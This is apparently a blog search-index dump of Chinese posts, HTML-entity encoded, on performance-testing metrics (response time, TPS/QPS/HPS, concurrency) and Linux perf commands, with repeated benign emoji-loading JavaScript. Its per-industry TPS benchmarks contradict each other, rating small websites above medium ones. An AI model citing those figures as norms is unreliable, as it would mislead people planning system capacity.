&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4; &#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x7528;&#x6237;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5F00;&#x59CB;&#xFF0C;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x6536;&#x5230;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x7ED3;&#x675F;&#xFF0C;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x6240;&#x8017;&#x8D39;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5728;&#x6027;&#x80FD;&#x68C0;&#x6D4B;&#x4E2D;&#x4E00;&#x822C;&#x4EE5;&#x538B;&#x529B;&#x53D1;&#x8D77;&#x7AEF;&#x81F3;&#x88AB;&#x538B;&#x6D4B;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x5904;&#x7406;&#x7ED3;&#x679C;&#x7684;&#x65F6;&#x95F4;&#x4E3A;&#x8BA1;&#x91CF;&#xFF0C;&#x5355;&#x4F4D;&#x4E00;&#x822C;&#x4E3A;&#x79D2;&#x6216;&#x6BEB;&#x79D2;&#x3002;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x7CFB;&#x7EDF;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x6BB5;&#x5185;&#xFF0C;&#x540C;&#x4E00;&#x4EA4;&#x6613;&#x7684;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002;&#x4E00;&#x822C;&#x800C;&#x8A00;&#xFF0C;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x5747;&#x6307;&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002; &#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x6807;&#x503C;&#x5E94;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x4EA4;&#x6613;&#x5206;&#x522B;&#x8BBE;&#x5B9A;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5206;&#x4E3A;&#x590D;&#x6742;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x7B80;&#x5355;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x7279;&#x6B8A;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x7279;&#x6B8A;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x7684;&#x8BBE;&#x5B9A;&#x5FC5;&#x987B;&#x660E;&#x786E;&#x8BE5;&#x4EA4;&#x6613;&#x5728;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x65B9;&#x9762;&#x7684;&#x7279;&#x6B8A;&#x6027;&#x3002; Response Time: &#x7B80;&#x79F0;RT &#x4E0D;&#x540C;&#x884C;&#x4E1A;&#x4E0D;&#x540C;&#x4E1A;&#x52A1;&#x53EF;&#x63A5;&#x53D7;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x662F;&#x4E0D;&#x540C;&#x7684;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#xFF0C;&#x5BF9;&#x4E8E;&#x5728;&#x7EBF;&#x5B9E;&#x65F6;&#x4EA4;&#x6613;&#xFF1A;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#xFF1A;500&#x6BEB;&#x79D2;&#x4EE5;&#x4E0B;&#xFF0C;&#x4F8B;&#x5982;&#x6DD8;&#x5B9D;&#x4E1A;&#x52A1;10&#x6BEB;&#x79D2;&#x5DE6;&#x53F3;&#x3002;&#x91D1;&#x878D;&#x4F01;&#x4E1A;&#xFF1A;1&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#xFF0C;&#x90E8;&#x5206;&#x590D;&#x6742;&#x4E1A;&#x52A1;3&#x79D2;&#x4EE5;&#x4E0B;&#x3002;&#x4FDD;&#x9669;&#x4F01;&#x4E1A;&#xFF1A;3&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#x3002;&#x5236;&#x9020;&#x4E1A;&#xFF1A;5&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#x3002; &#x5BF9;&#x4E8E;&#x6279;&#x91CF;&#x4EA4;&#x6613;&#xFF1A; &#x65F6;&#x95F4;&#x7A97;&#x53E3;&#xFF1A;&#x5373;&#x6574;&#x4E2A;&#x538B;&#x6D4B;&#x8FC7;&#x7A0B;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x540C;&#x6570;&#x636E;&#x91CF;&#x5219;&#x65F6;&#x95F4;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x4F8B;&#x5982;&#x53CC;11&#x548C;99&#x5927;&#x4FC3;&#xFF0C;&#x6570;&#x636E;&#x91CF;&#x7EA7;&#x4E0D;&#x4E00;&#x6837;&#x5219;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x4E0D;&#x540C;&#x3002;&#x5927;&#x6570;&#x636E;&#x91CF;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;2&#x5C0F;&#x65F6;&#x5185;&#x53EF;&#x5B8C;&#x6210;&#x538B;&#x6D4B;&#x3002; 3.2 &#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B; &#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x5728;&#x5229;&#x7528;&#x7CFB;&#x7EDF;&#x786C;&#x4EF6;&#x5E73;&#x53F0;&#x548C;&#x8F6F;&#x4EF6;&#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x4FE1;&#x606F;&#x5904;&#x7406;&#x7684;&#x80FD;&#x529B;&#x3002; &#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x901A;&#x8FC7;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x949F;&#x80FD;&#x591F;&#x5904;&#x7406;&#x7684;&#x4EA4;&#x6613;&#x6570;&#x91CF;&#x6765;&#x8BC4;&#x4EF7;&#xFF0C;&#x4EA4;&#x6613;&#x6709;&#x4E24;&#x79CD;&#x7406;&#x89E3;&#xFF1A;&#x4E00;&#x662F;&#x4E1A;&#x52A1;&#x4EBA;&#x5458;&#x89D2;&#x5EA6;&#x7684;&#x4E00;&#x7B14;&#x4E1A;&#x52A1;&#x8FC7;&#x7A0B;&#xFF1B;&#x4E8C;&#x662F;&#x7CFB;&#x7EDF;&#x89D2;&#x5EA6;&#x7684;&#x4E00;&#x6B21;&#x4EA4;&#x6613;&#x7533;&#x8BF7;&#x548C;&#x54CD;&#x5E94;&#x8FC7;&#x7A0B;&#x3002;&#x524D;&#x8005;&#x79F0;&#x4E3A;&#x4E1A;&#x52A1;&#x4EA4;&#x6613;&#x8FC7;&#x7A0B;&#xFF0C;&#x540E;&#x8005;&#x79F0;&#x4E3A;&#x4E8B;&#x52A1;&#x3002;&#x4E24;&#x79CD;&#x4EA4;&#x6613;&#x6307;&#x6807;&#x90FD;&#x53EF;&#x4EE5;&#x8BC4;&#x4EF7;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x7684;&#x5904;&#x7406;&#x80FD;&#x529B;&#x3002;&#x4E00;&#x822C;&#x7684;&#x5EFA;&#x8BAE;&#x4E0E;&#x7CFB;&#x7EDF;&#x4EA4;&#x6613;&#x65E5;&#x5FD7;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#xFF0C;&#x4EE5;&#x4FBF;&#x4E8E;&#x7EDF;&#x8BA1;&#x4E1A;&#x52A1;&#x91CF;&#x6216;&#x8005;&#x4EA4;&#x6613;&#x91CF;&#x3002;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x6307;&#x6807;&#x662F;&#x6280;&#x672F;&#x6D4B;&#x8BD5;&#x6D3B;&#x52A8;&#x4E2D;&#x91CD;&#x8981;&#x6307;&#x6807;&#x3002; &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7528;&#x4EE5;&#x4E0B;&#x6307;&#x6807;&#x6765;&#x5EA6;&#x91CF;&#xFF1A; HPS&#xFF08;Hits Per Second&#xFF09; &#xFF1A;&#x6BCF;&#x79D2;&#x70B9;&#x51FB;&#x6B21;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x6B21;/&#x79D2;&#x3002;TPS&#xFF08;Transaction per Second&#xFF09;&#xFF1A;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x5904;&#x7406;&#x4EA4;&#x6613;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x7B14;/&#x79D2;&#x3002;QPS&#xFF08;Query per Second&#xFF09;&#xFF1A;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x5904;&#x7406;&#x67E5;&#x8BE2;&#x6B21;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x6B21;/&#x79D2;&#x3002; &#x5BF9;&#x4E8E;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x4E9B;&#x4E1A;&#x52A1;&#x6709;&#x4E14;&#x4EC5;&#x6709;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;TPS=QPS=HPS&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x7528;TPS&#x6765;&#x8861;&#x91CF;&#x6574;&#x4E2A;&#x4E1A;&#x52A1;&#x6D41;&#x7A0B;&#xFF0C;&#x7528;QPS&#x6765;&#x8861;&#x91CF;&#x63A5;&#x53E3;&#x67E5;&#x8BE2;&#x6B21;&#x6570;&#xFF0C;&#x7528;HPS&#x6765;&#x8868;&#x793A;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x5355;&#x51FB;&#x8BF7;&#x6C42;&#x3002; &#x6807;&#x51C6; &#x65E0;&#x8BBA;TPS&#x3001;QPS&#x3001;HPS&#xFF0C;&#x6B64;&#x6307;&#x6807;&#x662F;&#x8861;&#x91CF;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x6307;&#x6807;&#xFF0C;&#x8D8A;&#x5927;&#x8D8A;&#x597D;&#xFF0C;&#x6839;&#x636E;&#x7ECF;&#x9A8C;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF1A;&#x91D1;&#x878D;&#x884C;&#x4E1A;&#xFF1A;1000 TPS&#x3002;&#x4FDD;&#x9669;&#x884C;&#x4E1A;&#xFF1A;100000 TPS&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x4E92;&#x8054;&#x7F51;&#x5316;&#x7684;&#x6D3B;&#x52A8;&#x3002;&#x5236;&#x9020;&#x884C;&#x4E1A;&#xFF1A;10 TPS&#x3002;&#x4E92;&#x8054;&#x7F51;&#x7535;&#x5B50;&#x5546;&#x52A1;&#xFF1A;1000000 TPS&#x3002;&#x4E92;&#x8054;&#x7F51;&#x4E2D;&#x578B;&#x7F51;&#x7AD9;&#xFF1A;1000 TPS&#x3002;&#x4E92;&#x8054;&#x7F51;&#x5C0F;&#x578B;&#x7F51;&#x7AD9;&#xFF1A;10000 TPS&#x3002; 3.3 &#x5E76;&#x53D1;&#x7528;&#x6237; &#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x6307;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x5185;&#xFF0C;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x5E76;&#x8FDB;&#x884C;&#x4E1A;&#x52A1;&#x64CD;&#x4F5C;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#x3002; &#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5BF9;&#x4E8E;&#x957F;&#x8FDE;&#x63A5;&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5373;&#x662F;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x80FD;&#x529B;&#x3002;&#x5BF9;&#x4E8E;&#x77ED;&#x8FDE;&#x63A5;&#x7CFB;&#x7EDF;&#x800C;&#x8A00;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5E76;&#x4E0D;&#x7B49;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x80FD;&#x529B;&#xFF0C;&#x800C;&#x662F;&#x4E0E;&#x7CFB;&#x7EDF;&#x67B6;&#x6784;&#x3001;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x7B49;&#x5404;&#x79CD;&#x60C5;&#x51B5;&#x76F8;&#x5173;&#x3002;&#x4F8B;&#x5982;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x80FD;&#x529B;&#x5F88;&#x5F3A;&#xFF0C;&#x52A0;&#x4E0A;&#x77ED;&#x8FDE;&#x63A5;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x8FDE;&#x63A5;&#x590D;&#x7528;&#xFF0C;&#x5F80;&#x5F80;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5927;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x8FDE;&#x63A5;&#x6570;&#x3002;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x5927;&#x90E8;&#x5206;&#x77ED;&#x8FDE;&#x63A5;&#x7C7B;&#x578B;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x541E;&#x5410;&#x91CF;&#x6A21;&#x5F0F;&#xFF08;RPS&#x6A21;&#x5F0F;&#xFF0C;Request Per Second&#xFF09;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#xFF0C;&#x4E5F;&#x662F;&#x963F;&#x91CC;&#x7684;&#x6700;&#x4F73;&#x5B9E;&#x8DF5;&#xFF0C;PTS&#x652F;&#x6301;RPS&#x6A21;&#x5F0F;&#x7684;&#x538B;&#x6D4B;&#xFF0C;&#x541E;&#x5410;&#x91CF;&#x7684;&#x538B;&#x6D4B;&#x6784;&#x5EFA;&#x548C;&#x8861;&#x91CF;&#x4E00;&#x6B65;&#x5230;&#x4F4D;&#x3002; &#x5728;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x91C7;&#x7528;&#x865A;&#x62DF;&#x7528;&#x6237;&#x6765;&#x6A21;&#x62DF;&#x73B0;&#x5B9E;&#x4E2D;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x4E1A;&#x52A1;&#x64CD;&#x4F5C;&#x3002; Virtual User&#xFF1A;&#x7B80;&#x79F0;VU &#x6807;&#x51C6; &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x662F;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x51FA;&#x6765;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6D4B;&#x8BD5;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#xFF0C;&#x9664;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x957F;&#x8FDE;&#x63A5;&#x53EF;&#x80FD;&#x5F71;&#x54CD;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5916;&#xFF0C;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x4E0D;&#x53D7;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5F71;&#x54CD;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6700;&#x5C0F;&#x7684;&#x7528;&#x6237;&#x6570;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x8BD5;&#x51FA;&#x6765;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x66F4;&#x591A;&#x7684;&#x7528;&#x6237;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x8BD5;&#x51FA;&#x6765;&#x3002; 3.4 &#x9519;&#x8BEF;&#x7387;&#x5B9A;&#x4E49;&#x53CA;&#x89E3;&#x91CA; &#x539F;&#x6587;https://www.leoheng.com/2021/06/25/%E5%B8%B8%E7%94%A8%E6%80%A7%E8%83%BD%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux常用性能分析工具","date":"2022-06-07T04:54:45.000Z","path":"/posts/d53cba09/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux性能管理工具","date":"2022-06-07T04:54:32.000Z","path":"/posts/480c215d/","text":"&#x6027;&#x80FD;&#x6D4B;&#x8BD5;perf&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4; perf stat &#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x63D0;&#x4F9B;&#x5E38;&#x89C1;&#x7684;&#x6027;&#x80FD;&#x4E8B;&#x4EF6;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x8BF4;&#x660E;&#x6267;&#x884C;&#x548C;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x949F;&#x5468;&#x671F;&#x3002; perf record &#x8BE5;&#x547D;&#x4EE4;&#x80FD;&#x591F;&#x5C06;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x5E76;&#x751F;&#x6210;&#x4E00;&#x4E2A;perf.data&#x6587;&#x4EF6; perf report &#x8BE5;&#x547D;&#x4EE4;&#x4ECE;perf record&#x751F;&#x6210;&#x7684;perf.data&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x53D6;&#x5E76;&#x663E;&#x793A;&#x4E8B;&#x4EF6;&#x6570;&#x636E;&#x3002; perf list &#x5217;&#x51FA;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x53EF;&#x7528;&#x4E8B;&#x4EF6; perf top &#x8BE5;&#x547D;&#x4EE4;&#x4E0E;top&#x547D;&#x4EE4;&#x7C7B;&#x4F3C;&#xFF0C;&#x5B9E;&#x65F6;&#x663E;&#x793A;&#x6027;&#x80FD;&#x4E8B;&#x4EF6; perf trace &#x8BE5;&#x547D;&#x4EE4;&#x4E0E;strace&#x547D;&#x4EE4;&#x7C7B;&#x4F3C;&#xFF0C;&#x76D1;&#x89C6;&#x6307;&#x5B9A;&#x7EBF;&#x7A0B;&#x6216;&#x8FDB;&#x7A0B;&#x4F7F;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x4EE5;&#x53CA;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6240;&#x6709;&#x4FE1;&#x53F7;&#x3002; perf help 12345678perf list # &#x67E5;&#x770B;&#x5F53;&#x524D;&#x652F;&#x6301;&#x7684;&#x6240;&#x6709;&#x4E8B;&#x4EF6;# [Software event]&#x8F6F;&#x4EF6;&#x4E8B;&#x4EF6;# [Tool event]# [Hardware cache event] &#x786C;&#x4EF6;&#x7F13;&#x5B58;&#x4E8B;&#x4EF6;# [Kernel PMU event] PMU&#x4E8B;&#x4EF6;# [Hardware event]# Tracepoint event# &#x6027;&#x80FD;&#x4F18;&#x5316; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"性能测试指标详解","date":"2022-06-07T04:54:19.000Z","path":"/posts/fa35a60d/","text":"&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;&#x662F;&#x8861;&#x91CF;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x7684;&#x8BC4;&#x4EF7;&#x6807;&#x51C6;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;&#x5305;&#x62EC;&#xFF1A;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x5E76;&#x53D1;&#x3001;&#x70B9;&#x51FB;&#x7387;&#x3001;&#x541E;&#x5410;&#x91CF;&#x3001;TPS/QPS&#x3001;PV/UV&#xFF1B;Linux&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#x5305;&#x62EC;&#xFF1A;CPU&#x4F7F;&#x7528;&#x7387;&#x3001;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x3001;&#x78C1;&#x76D8;IO&#x3001;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7B49;&#x3002; &#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;1.1 &#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x662F;&#x6307;&#x67D0;&#x4E2A;&#x8BF7;&#x6C42;&#x6216;&#x64CD;&#x4F5C;&#x53D1;&#x51FA;&#x5230;&#x63A5;&#x6536;&#x5230;&#x53CD;&#x9988;&#x6240;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x5305;&#x62EC;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x5BA2;&#x6237;&#x7AEF;&#xFF09;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x3001;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x3002;&#x6BD4;&#x5982;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#x4ECE;&#x70B9;&#x51FB;/&#x8F93;&#x5165;&#x5230;&#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x589E;&#x52A0;&#x3001;&#x5220;&#x9664;&#x3001;&#x4FEE;&#x6539;&#x6216;&#x8005;&#x67E5;&#x8BE2;&#x52A8;&#x4F5C;&#x7684;&#x4E8B;&#x52A1;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x7B49;&#x3002; &#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;&#x4F20;&#x8F93;&#x5F80;&#x5F80;&#x8981;&#x7ECF;&#x5386;&#x591A;&#x4E2A;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x624D;&#x80FD;&#x5230;&#x8FBE;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6211;&#x4EEC;&#x5047;&#x8BBE;&#x8BF7;&#x6C42;&#x7ECF;&#x5386;&#x4E86;&#x4E09;&#x4E2A;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x7684;&#x4F20;&#x8F93;&#x65F6;&#x95F4;B1&#x3001;B2&#x3001;B3&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x4E3A;A&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x4E3A;C&#x3002;&#x5219;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x7684;&#x5B8C;&#x6574;&#x8DEF;&#x5F84;&#x53EF;&#x4EE5;&#x63CF;&#x8FF0;&#x4E3A;&#x4E0B;&#x56FE;&#xFF1A; &#x5BA2;&#x6237;&#x7AEF;&#x4ECE;&#x53D1;&#x51FA;&#x8BF7;&#x6C42;&#x5230;&#x63A5;&#x6536;&#x5230;&#x670D;&#x52A1;&#x5668;&#x53CD;&#x9988;&#x7684;&#x5B8C;&#x6574;&#x94FE;&#x8DEF;&#x65F6;&#x95F4;&#x4E3A;A&#x2014;&gt;B1&#x2014;&gt;B2&#x2014;&gt;B3&#x2014;&gt;C&#xFF08;&#x8282;&#x70B9;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x90FD;&#x5305;&#x62EC;&#x63A5;&#x6536;&#x548C;&#x53D1;&#x9001;&#x4E24;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF09;&#x3002;&#x5219;&#x8BF7;&#x6C42;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x4E3A;&#xFF1A; &#x54CD;&#x5E94;&#x65F6;&#x95F4;=A+B1+B2+B3+C 1.2 &#x5E76;&#x53D1;&#x5E76;&#x53D1;&#x662F;&#x6307;&#x591A;&#x4E2A;&#x7528;&#x6237;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x671F;&#x5185;&#x8FDB;&#x884C;&#x76F8;&#x540C;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x6216;&#x64CD;&#x4F5C;&#x3002;&#x7531;&#x4E8E;&#x7528;&#x6237;&#x5728;&#x8FDB;&#x884C;&#x4E00;&#x7CFB;&#x5217;&#x64CD;&#x4F5C;&#x6D41;&#x7A0B;&#x65F6;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF08;&#x5373;&#x7528;&#x6237;&#x601D;&#x8003;&#x65F6;&#x95F4;&#xFF09;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x6709;&#x5148;&#x540E;&#x987A;&#x5E8F;&#xFF0C;&#x4E8E;&#x662F;&#xFF0C;&#x5C31;&#x4EA7;&#x751F;&#x4E86;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x548C;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x6982;&#x5FF5;&#x7684;&#x533A;&#x5206;&#x3002; &#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x523B;&#xFF08;&#x5373;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x70B9;&#xFF09;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002; &#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x662F;&#x6307;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#xFF08;&#x5373;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x533A;&#x95F4;&#xFF09;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002; 